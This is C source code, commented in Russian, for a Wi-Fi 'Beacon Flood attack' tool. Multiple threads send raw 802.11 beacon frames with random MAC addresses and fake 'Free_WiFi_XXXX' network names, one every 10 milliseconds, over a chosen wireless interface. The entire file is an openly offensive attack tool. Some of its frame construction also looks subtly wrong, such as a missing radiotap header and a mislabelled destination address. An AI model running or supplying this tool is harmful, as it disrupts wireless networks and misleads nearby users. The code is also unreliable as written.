#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <linux/wireless.h>

// Структура IEEE 802.11 заголовка
struct ieee80211_hdr {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctrl;
} __attribute__((packed));

// Структура фрейма beacon
struct beacon_frame {
    struct ieee80211_hdr hdr;
    uint64_t timestamp;
    uint16_t beacon_interval;
    uint16_t capability;
    // Поля информации (SSID, параметры)
    uint8_t data[0];
} __attribute__((packed));

// Глобальные переменные
volatile int running = 1;
char iface[10] = "wlan0";

// Генерация случайного MAC
void random_mac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = rand() % 256;
    }
    // Устанавливаем локально администрируемый бит
    mac[0] &= ~0x01; // Unicast
    mac[0] |= 0x02;  // Locally administered
}

// Создание beacon фрейма
void create_beacon_frame(uint8_t *frame, const char *ssid) {
    struct beacon_frame *beacon = (struct beacon_frame *)frame;
    
    // Заголовок
    beacon->hdr.frame_control = 0x0080; // Beacon frame
    random_mac(beacon->hdr.addr1);      // Destination (broadcast)
    random_mac(beacon->hdr.addr2);      // Source (BSSID)
    random_mac(beacon->hdr.addr3);      // BSSID
    
    // Поля beacon
    beacon->timestamp = time(NULL);
    beacon->beacon_interval = htons(100);
    beacon->capability = htons(0x0001); // ESS
    
    // SSID field
    uint8_t *ptr = beacon->data;
    *ptr++ = 0x00; // SSID parameter ID
    *ptr++ = strlen(ssid); // Length
    memcpy(ptr, ssid, strlen(ssid));
    ptr += strlen(ssid);
    
    // Поддержка скоростей
    uint8_t rates[] = {0x01, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c}; // 1,2,5.5,11,6,9,12,18,24 Mbps
    *ptr++ = 0x01; // Supported rates ID
    *ptr++ = sizeof(rates);
    memcpy(ptr, rates, sizeof(rates));
    ptr += sizeof(rates);
    
    // Канал (частота)
    uint8_t channel = 1 + rand() % 13;
    *ptr++ = 0x03; // DS Parameter set
    *ptr++ = 0x01;
    *ptr++ = channel;
}

// Поток для отправки beacon
void *beacon_thread(void *arg) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        return NULL;
    }
    
    // Получаем индекс интерфейса
    struct ifreq if_idx;
    strncpy(if_idx.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(sock, SIOCGIFINDEX, &if_idx) < 0) {
        perror("SIOCGIFINDEX");
        close(sock);
        return NULL;
    }
    
    // Настраиваем сокет
    struct sockaddr_ll sa = {
        .sll_family = AF_PACKET,
        .sll_ifindex = if_idx.ifr_ifindex,
        .sll_halen = ETH_ALEN,
        .sll_addr = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff} // Broadcast
    };
    
    // Буфер для фрейма
    uint8_t frame[256];
    char ssid[32];
    
    while (running) {
        // Генерируем случайный SSID
        snprintf(ssid, sizeof(ssid), "Free_WiFi_%04X", rand() % 0xFFFF);
        
        // Создаем фрейм
        memset(frame, 0, sizeof(frame));
        create_beacon_frame(frame, ssid);
        size_t frame_len = 24 + 12 + strlen(ssid) + 2 + 10; // Заголовок + SSID + rates
        
        // Отправляем
        if (sendto(sock, frame, frame_len, 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
            perror("sendto");
            break;
        }
        
        // Задержка
        usleep(10000); // 10 ms
    }
    
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    // Параметры командной строки
    int threads = 5;
    if (argc > 1) threads = atoi(argv[1]);
    if (argc > 2) strncpy(iface, argv[2], sizeof(iface)-1);
    
    printf("[+] Starting Beacon Flood attack on %s\n", iface);
    printf("[+] Using %d threads\n", threads);
    
    // Инициализация
    srand(time(NULL));
    pthread_t tid[threads];
    
    // Запуск потоков
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&tid[i], NULL, beacon_thread, NULL) != 0) {
            perror("pthread_create");
            return 1;
        }
    }
    
    // Ожидание завершения
    printf("[!] Press Enter to stop...\n");
    getchar();
    running = 0;
    
    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }
    
    printf("[+] Attack stopped\n");
    return 0;
}